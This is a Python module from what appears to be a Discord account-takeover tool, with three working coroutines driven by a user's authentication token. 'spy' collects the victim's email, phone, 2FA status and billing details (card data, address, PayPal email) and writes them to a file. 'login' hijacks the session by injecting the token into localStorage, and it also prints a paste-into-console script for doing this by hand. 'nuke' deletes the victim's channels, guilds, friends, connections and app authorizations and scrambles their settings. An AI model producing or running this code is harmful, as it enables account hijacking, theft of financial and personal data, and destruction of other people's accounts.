"""
osiris_coroutines.py

This namespace contains coroutines for the Osiris thread to run.
- spy: Gathers information about a Discord user.
- login: Logs into a Discord account.
- nuke: Nukes a Discord account.
"""

import aiohttp
import asyncio
import httpx
import os
import requests
import typing
from selenium import webdriver
from selenium.common.exceptions import WebDriverException
from selenium.webdriver.common.by import By
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.chrome.service import Service as ChromeService
from selenium.webdriver.firefox.service import Service as FirefoxService
from selenium.webdriver.edge.service import Service as EdgeService
from webdriver_manager.chrome import ChromeDriverManager
from webdriver_manager.firefox import GeckoDriverManager
from webdriver_manager.microsoft import EdgeChromiumDriverManager

import shared.utils.utils_log as lu
import shared.utils.utils_io as iou
from shared.dr.dr_types import ED_BillingSourceTypes, EO_Commands_FriendlyNames, EO_Browsers

API_BASE = 'https://discord.com/api/v10'
AUTH_FAIL = 'The user authentication token provided is invalid or has expired.'


async def spy(thread, **kwargs):
    thread.signal_spy_running.emit(True)
    __add_to_running_commands_view(thread, EO_Commands_FriendlyNames.SPY.value)
    
    auth_token = kwargs.get('auth_token', None)
    if (data := __check_auth_token(thread, auth_token)) is None:
        __remove_from_running_commands_view(thread, EO_Commands_FriendlyNames.SPY.value)
        thread.signal_spy_running.emit(False)
        return
    
    username = f'{data["username"]}'
    user_id = data['id']
    phone = data['phone']
    email = data['email']
    mfa = data['mfa_enabled']
    
    info = f'''Account Information
{"*"*19}

[User ID]{' '*11}{user_id}
[Username]{' '*10}{username}
[Email]{' '*13}{email if email else 'None'}
[Phone]{' '*13}{phone if phone else 'None'}
[2FA]{' '*15}{'Enabled' if mfa else 'Disabled'}
[OAuth]{' '*13}{auth_token}'''

    headers = {
        "Authorization": auth_token,
        "Content-Type": "application/json"
    }
    
    billing_info_url = f'{API_BASE}/users/@me/billing/payment-sources'
    nitro_status_url = f'{API_BASE}/users/@me/billing/subscriptions'

    bill_sources, nitro_status = await asyncio.gather(
        __fetch_data(billing_info_url, headers),
        __fetch_data(nitro_status_url, headers)
    )

    user_has_nitro = bool(nitro_status)
    
    if bool(bill_sources):
        info += f'\n\nBilling Information\n{"*"*19}\n\n'
        for source_data in bill_sources:
            info += f'[Has Nitro]{" "*9}{"Yes" if user_has_nitro else "No"}\n'
            
            match source_data['type']:
                case ED_BillingSourceTypes.CARD.value:
                    info += f'[Card Brand]{" "*8}{source_data["brand"]}\n'
                    info += f'[Last 4 Digits]{" "*5}{source_data["last_4"]}\n'
                    info += f'[Expiry Date]{" "*7}{source_data["expires_month"]}/{source_data["expires_year"]}\n'
                    info += f'[Billing Name]{" "*6}{source_data["billing_address"]["name"]}\n'
                    info += f'[Address ln.1]{" "*6}{source_data["billing_address"]["line_1"]}\n'
                    info += f'[Address ln.2]{" "*6}{source_data["billing_address"]["line_2"]}\n'
                    info += f'[Country]{" "*11}{source_data["billing_address"]["country"]}\n'
                    info += f'[State]{" "*13}{source_data["billing_address"]["state"]}\n'
                    info += f'[City]{" "*14}{source_data["billing_address"]["city"]}\n'
                    info += f'[Postal Code]{" "*13}{source_data["billing_address"]["postal_code"]}\n\n'
                case ED_BillingSourceTypes.PAYPAL.value:
                    info += f'[PayPal Email]{" "*6}{source_data["email"]}\n'
                    info += f'[Billing Name]{" "*6}{source_data["billing_address"]["name"]}\n'
                    info += f'[Address ln.1]{" "*6}{source_data["billing_address"]["line_1"]}\n'
                    info += f'[Address ln.2]{" "*6}{source_data["billing_address"]["line_2"]}\n'
                    info += f'[Country]{" "*11}{source_data["billing_address"]["country"]}\n'
                    info += f'[State]{" "*13}{source_data["billing_address"]["state"]}\n'
                    info += f'[City]{" "*14}{source_data["billing_address"]["city"]}\n'
                    info += f'[Postal Code]{" "*7}{source_data["billing_address"]["postal_code"]}\n\n'
                case _:
                    info += 'None'
        info += f'\n[Token]{" "*13}{auth_token}'

    i = 2
    file_path = os.path.join('accounts', f'{user_id}.txt')
    while os.path.exists(file_path):
        user_id = f'{user_id}_{i}'
        file_path = os.path.join('accounts', f'{user_id}.txt')
        i += 2

    iou.mkfile(file_path, info, 'utf-8')
    
    thread.signal_append_oterminal.emit(f'User information saved to {file_path}')

    __remove_from_running_commands_view(thread, EO_Commands_FriendlyNames.SPY.value)
    thread.signal_spy_running.emit(False)


async def login(thread, **kwargs):

    def perform_login(thread, driver, auth_token: str):
        driver.implicitly_wait(30)
        thread.signal_append_oterminal.emit('Attempting to login to account. . .')
        thread.signal_append_oterminal.emit('Navigating to Discord login page. . .')
        driver.get('https://discord.com/login')
        thread.signal_append_oterminal.emit('Waiting for login page to load. . .')
        WebDriverWait(driver, 30).until(
            EC.visibility_of_element_located(
                (
                    By.XPATH,
                    "//h1[contains(text(),'Welcome back!')]"
                )
            )
        )
        thread.signal_append_oterminal.emit('Login page loaded. . .')
        script = '''
            function login(token) {
                setInterval(() => {
                    document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
                }, 50);
                setTimeout(() => {
                    location.reload();
                }, 2500);
            }'''
        thread.signal_append_oterminal.emit('Executing login script with provided token. . .')
        driver.execute_script(script + f'\nlogin("{auth_token}")')
        thread.signal_append_oterminal.emit('Login script executed. . .')


    def launch_browser(browser: int):
        match browser:
            case EO_Browsers.CHROME.value:
                from selenium.webdriver.chrome.options import Options
                options = Options()
                webdriver_instance = webdriver.Chrome
                driver_manager = ChromeDriverManager
                service = ChromeService(executable_path=driver_manager().install())
            case EO_Browsers.FIREFOX.value:
                from selenium.webdriver.firefox.options import Options
                options = Options()
                webdriver_instance = webdriver.Firefox
                driver_manager = GeckoDriverManager
                service = FirefoxService(executable_path=driver_manager().install())
            case EO_Browsers.EDGE.value:
                from selenium.webdriver.edge.options import Options
                options = Options()
                webdriver_instance = webdriver.Edge
                driver_manager = EdgeChromiumDriverManager
                service = EdgeService(executable_path=driver_manager().install())
            case _:
                return None
        
        if browser == EO_Browsers.CHROME.value or browser == EO_Browsers.EDGE.value:
            options.add_experimental_option('detach', True)
        elif browser == EO_Browsers.FIREFOX.value:
            options.set_preference('detach', True)
        
        driver = webdriver_instance(service=service, options=options)
        return driver

    thread.signal_login_running.emit(True)
    __add_to_running_commands_view(thread, EO_Commands_FriendlyNames.LOGIN.value)

    auth_token = kwargs.get('auth_token', None)
    if __check_auth_token(thread, auth_token) is None:
        __remove_from_running_commands_view(thread, EO_Commands_FriendlyNames.LOGIN.value)
        thread.signal_login_running.emit(False)
        return
    
    browser = kwargs.get('browser', None)
    if browser is None:
        thread.signal_append_oterminal.emit('If you\'re having trouble logging in automatically, or your browser is not supported, you can log in manually by pasting the following script into the developer console on the Discord login page:\n\n\
function login() { setInterval(() => { document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = ' + f'`"{auth_token}"`' + ' }, 50); setTimeout(() => { location.reload(); }, 2500); } login();\n\nPaste the script, then hit RETURN!')
        __remove_from_running_commands_view(thread, EO_Commands_FriendlyNames.LOGIN.value)
        thread.signal_login_running.emit(False)
        return
    
    driver = launch_browser(browser)
    if not driver:
        thread.signal_append_oterminal.emit('Failed to launch browser.')
        __remove_from_running_commands_view(thread, EO_Commands_FriendlyNames.LOGIN.value)
        thread.signal_login_running.emit(False)
    
    try:
        perform_login(thread, driver, auth_token)
        thread.signal_append_oterminal.emit(f'Login attempt successful.')
    except WebDriverException as e:
        thread.signal_append_oterminal.emit(f'Failed to login to account with WebDriverException: {e}')
        __remove_from_running_commands_view(thread, EO_Commands_FriendlyNames.LOGIN.value)
        thread.signal_login_running.emit(False)
        return
    
    __remove_from_running_commands_view(thread, EO_Commands_FriendlyNames.LOGIN.value)
    thread.signal_login_running.emit(False)

    
async def __delete_channel(channel_id: int, headers: typing.Dict, thread) -> None:

    async def make_delete_channel_request(session: aiohttp.ClientSession, channel_id: int):
        while True:
            async with session.delete(f'{API_BASE}/channels/{channel_id}') as resp:
                if resp.status in (200, 201, 204):
                    thread.signal_append_oterminal.emit(f'Deleted channel {channel_id} successfully.')
                    return
                elif resp.status == 429:
                    retry_after = int(resp.headers.get('Retry-After', '1'))
                    thread.signal_append_oterminal.emit(f'Rate limited, retrying after {retry_after} seconds.')
                    await asyncio.sleep(retry_after)
                else:
                    thread.signal_append_oterminal.emit(f'Failed to delete channel {channel_id} with status code {resp.status}.')
                    json = await resp.json()
                    text = await resp.text()
                    lu.serror(f'JSON: {json}')
                    lu.serror(f'Text: {text}')
                    raise aiohttp.ClientError

    async with aiohttp.ClientSession(headers=headers) as session:
        await make_delete_channel_request(session, channel_id)


async def __remove_guild(guild_id: int, is_owner: bool, headers: typing.Dict, thread) -> None:

    async def make_remove_guild_request(session: aiohttp.ClientSession, guild_id: int, is_owner: bool):
        url = f'{API_BASE}/guilds/{guild_id}' if is_owner else f'{API_BASE}/users/@me/guilds/{guild_id}'
        while True:
            async with session.delete(url) as resp:
                if resp.status in (200, 201, 204):
                    thread.signal_append_oterminal.emit(f'Left guild {guild_id} successfully.')
                    return
                elif resp.status == 429:
                    retry_after = int(resp.headers.get('Retry-After', '1'))
                    thread.signal_append_oterminal.emit(f'Rate limited, retrying after {retry_after} seconds.')
                    await asyncio.sleep(retry_after)
                else:
                    thread.signal_append_oterminal.emit(f'Failed to leave guild {guild_id} with status code {resp.status}.')
                    json = await resp.json()
                    text = await resp.text()
                    lu.serror(f'JSON: {json}')
                    lu.serror(f'Text: {text}')
                    raise aiohttp.ClientError

    async with aiohttp.ClientSession(headers=headers) as session:
        await make_remove_guild_request(session, guild_id, is_owner)


async def __delete_friend(friend_id: int, headers: typing.Dict, thread) -> None:

    async def make_delete_friend_request(session: aiohttp.ClientSession, friend_id: int):
        while True:
            async with session.delete(f'{API_BASE}/users/@me/relationships/{friend_id}') as resp:
                if resp.status in (200, 201, 204):
                    thread.signal_append_oterminal.emit(f'Deleted friend {friend_id} successfully.')
                    return
                elif resp.status == 429:
                    retry_after = int(resp.headers.get('Retry-After', '1'))
                    thread.signal_append_oterminal.emit(f'Rate limited, retrying after {retry_after} seconds.')
                    await asyncio.sleep(retry_after)
                else:
                    thread.signal_append_oterminal.emit(f'Failed to delete friend {friend_id} with status code {resp.status}.')
                    json = await resp.json()
                    text = await resp.text()
                    lu.serror(f'JSON: {json}')
                    lu.serror(f'Text: {text}')
                    raise aiohttp.ClientError

    async with aiohttp.ClientSession(headers=headers) as session:
        await make_delete_friend_request(session, friend_id)


async def __delete_connection(connection_type: str, connection_id: int, headers: typing.Dict, thread) -> None:

    async def make_delete_connection_request(session: aiohttp.ClientSession, connection_type: str, connection_id: int):
        while True:
            async with session.delete(f'{API_BASE}/users/@me/connections/{connection_type}/{connection_id}') as resp:
                if resp.status in (200, 201, 204):
                    thread.signal.append_oterminal.emit(f'Deleted connection {connection_type} {connection_id} successfully.')
                    return
                elif resp.status == 429:
                    retry_after = int(resp.headers.get('Retry-After', '1'))
                    thread.signal.append_oterminal.emit(f'Rate limited, retrying after {retry_after} seconds.')
                    await asyncio.sleep(retry_after)
                else:
                    thread.signal.append_oterminal.emit(f'Failed to delete connection {connection_type} {connection_id} with status code {resp.status}.')
                    json = await resp.json()
                    text = await resp.text()
                    lu.serror(f'JSON: {json}')
                    lu.serror(f'Text: {text}')
                    raise aiohttp.ClientError

    async with aiohttp.ClientSession(headers=headers) as session:
        await make_delete_connection_request(session, connection_type, connection_id)


async def __deauth_app(app_id: int, headers: typing.Dict, thread) -> None:

    async def make_deauth_app_request(session: aiohttp.ClientSession, app_id: int):
        while True:
            async with session.delete(f'{API_BASE}/oauth2/tokens/{app_id}') as resp:
                if resp.status in (200, 201, 204):
                    thread.signal.append_oterminal.emit(f'Deauthorized app {app_id} successfully.')
                    return
                elif resp.status == 429:
                    retry_after = int(resp.headers.get('Retry-After', '1'))
                    thread.signal.append_oterminal.emit(f'Rate limited, retrying after {retry_after} seconds.')
                    await asyncio.sleep(retry_after)
                else:
                    thread.signal.append_oterminal.emit(f'Failed to deauthorize app {app_id} with status code {resp.status}.')
                    json = await resp.json()
                    text = await resp.text()
                    lu.serror(f'JSON: {json}')
                    lu.serror(f'Text: {text}')
                    raise aiohttp.ClientError

    async with aiohttp.ClientSession(headers=headers) as session:
        await make_deauth_app_request(session, app_id)


async def nuke(thread, **kwargs) -> str:

    thread.signal_nuke_running.emit(True)
    __add_to_running_commands_view(thread, EO_Commands_FriendlyNames.NUKE.value)

    auth_token = kwargs.get('auth_token', None)
    if (data := __check_auth_token(thread, auth_token)) is None:
        __remove_from_running_commands_view(thread, EO_Commands_FriendlyNames.NUKE.value)
        thread.signal_nuke_running.emit(False)
        return
    
    thread.signal_append_oterminal.emit(f'\nNuking account: {data["username"]}... \nThis may take some time.')

    headers = {
        "Authorization": auth_token
    }
        
    # Delete all channels
    channels = requests.get(f'{API_BASE}/users/@me/channels', headers=headers).json()
    await asyncio.gather(*[__delete_channel(channel['id'], headers, thread) for channel in channels])

    # Leave/Delete all guilds
    guilds = requests.get(f'{API_BASE}/users/@me/guilds', headers=headers).json()
    await asyncio.gather(*[__remove_guild(guild['id'], guild['owner'], headers, thread) for guild in guilds])

    # Delete all friends
    friends = requests.get(f'{API_BASE}/users/@me/relationships', headers=headers).json()
    await asyncio.gather(*[__delete_friend(friend['id'], headers, thread) for friend in friends])

    # Delete all connections
    connections = requests.get(f'{API_BASE}/users/@me/connections', headers=headers).json()
    await asyncio.gather(*[__delete_connection(connection['type'], connection['id'], headers, thread) for connection in connections])

    # Deauthorize all applications
    app_tokens = requests.get(f'{API_BASE}/oauth2/tokens', headers=headers).json()
    await asyncio.gather(*[__deauth_app(app['id'], headers, thread) for app in app_tokens])

    # Leave Hype Squad
    requests.delete(f'{API_BASE}/hypesquad/online', headers=headers)

    # Update the user's settings 
    settings = {
        "locale": "ja",
        "show_current_game": False,
        "default_guilds_restricted": True,
        "inline_attatchment_media": False,
        "inline_embed_media": False,
        "gif_auto_play": False,
        "render_embeds": False,
        "render_reactions": False,
        "animate_emoji": False,
        "enable_tts_command": False,
        "message_display_compact": True,
        "convert_emoticons": False,
        "explicit_content_filter": 0,
        "disable_games_tab": True,
        "theme": "light",
        "detect_platform_accounts": False,
        "stream_notifications_enabled": False,
        "animate_stickers": False,
        "view_nsfw_guilds": True,
    }
    
    requests.patch(f'{API_BASE}/users/@me/settings', headers=headers, json=settings)

    thread.signal_append_oterminal.emit(f'Nuke completed successfully.')
    __remove_from_running_commands_view(thread, EO_Commands_FriendlyNames.NUKE.value)
    thread.signal_nuke_running.emit(False)


def __check_auth_token(thread, auth_token: str) -> ...:
    if not auth_token:
        thread.signal_append_oterminal.emit('No user authentication token provided.')
        return None
    
    headers = {
        "Authorization": auth_token,
        "Content-Type": "application/json"
    }
    response = requests.get(f"{API_BASE}/users/@me", headers=headers)

    if response.status_code == 200:
        return response.json()
    
    thread.signal_append_oterminal.emit(AUTH_FAIL)
    return None


async def __fetch_data(url, headers):
    async with httpx.AsyncClient() as client:
        response = await client.get(url, headers=headers)
    return response.json()


def __add_to_running_commands_view(thread, command_name: str):
    thread.running_commands_names.append(command_name)
    thread.signal_refresh_running_commands_view.emit(0)


def __remove_from_running_commands_view(thread, command_name: str):
    thread.running_commands_names.remove(command_name)
    thread.signal_refresh_running_commands_view.emit(0)
